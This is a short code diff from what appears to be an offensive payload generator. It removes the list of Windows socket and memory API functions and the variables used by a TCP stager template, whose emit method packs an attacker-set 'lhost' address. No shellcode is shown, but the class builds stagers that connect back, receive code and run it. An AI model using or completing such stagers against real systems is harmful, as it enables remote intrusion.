@@ -32,21 +32,6 @@ from ..encode import encode_dword, encode_word, safe_push_word_as_dword
 
 
 class TcpStagerTemplate(PayloadTemplate):
-    REQUIRED_FUNCTIONS = (
-        "LoadLibraryA",
-        "WSAStartup",
-        "WSASocketA",
-        "connect",
-        "recv",
-        "closesocket",
-        "VirtualAlloc",
-    )
-    REQUIRED_VARIABLES = (
-        "socket_handle",
-        "virt_buf",
-        "bytes_total",
-        "bytes_recvd",
-    )
 
     def emit(self, layout, config: TemplateConfig) -> str:
         ip_le   = struct.unpack("<I", socket.inet_aton(config.lhost))[0]
